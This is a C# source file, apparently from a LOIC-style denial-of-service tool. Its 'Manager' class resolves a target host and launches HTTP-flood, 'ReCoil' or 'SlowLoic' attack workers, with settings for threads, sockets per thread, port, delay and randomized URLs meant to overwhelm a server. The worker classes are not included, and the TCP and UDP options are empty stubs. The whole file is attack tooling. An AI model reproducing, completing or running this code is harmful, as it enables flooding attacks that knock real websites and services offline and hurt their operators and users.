﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Net;

namespace GAS.Core
{
    public enum AttackMethod
    {
        TCP,
        UDP,
        HTTP,
        ReCoil,
        SlowLOIC
    }
    public class Manager
    {
        #region Attack info
        public int Timeout = 30, Threads = 10, SPT = 50, Port = 80, Delay = 0;
            public AttackMethod Method;
            public IPAddress Target = locolhaust;
            public bool WaitForResponse = false, AppendRANDOMChars = false, AppendRANDOMCharsUrl=false, UseGZIP = false, USEGet = false;
            public string Subsite = "/";
        #endregion
        static IPAddress locolhaust = IPAddress.Parse("127.0.0.1");
        public IAttacker Worker;
        public bool LockOn(string host)
        {
            host = host.Trim().ToLower();
            if (IPAddress.TryParse(host, out Target))
                return true;
            else
            {
                try
                {
                    if (!host.StartsWith("http://") && !host.StartsWith("https://")) host = String.Concat("http://", host);
                    var trg =new Uri(host);
                    Target = Dns.GetHostEntry(trg.Host).AddressList[0];
                    Subsite=trg.PathAndQuery;
                    return true;
                }
                catch
                {
                    Target = locolhaust;
                    throw new Exception("Wrong HOST");
                }
            }
        }
        public void Stop()
        {
            if (Worker != null)
                Worker.Stop();
        }
        public void Start()
        {
            Stop();
            switch (Method)
            {
                case AttackMethod.HTTP:
                    Worker = new HTTPFlooder(Target.ToString(), Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads);
                    break;
                case AttackMethod.ReCoil:
                    Worker = new ReCoil(Target.ToString(), Target.ToString(), Port, Subsite, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, WaitForResponse, SPT, UseGZIP, Threads);
                    break;
                case AttackMethod.SlowLOIC:
                    Worker=new SlowLoic(Target.ToString(), Target.ToString(), Port, Subsite, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, SPT, AppendRANDOMCharsUrl,USEGet, UseGZIP, Threads);
                    break;
                case AttackMethod.TCP:
                    break;
                case AttackMethod.UDP:
                    break;
            }
            Worker.Start();
        }
    }
}
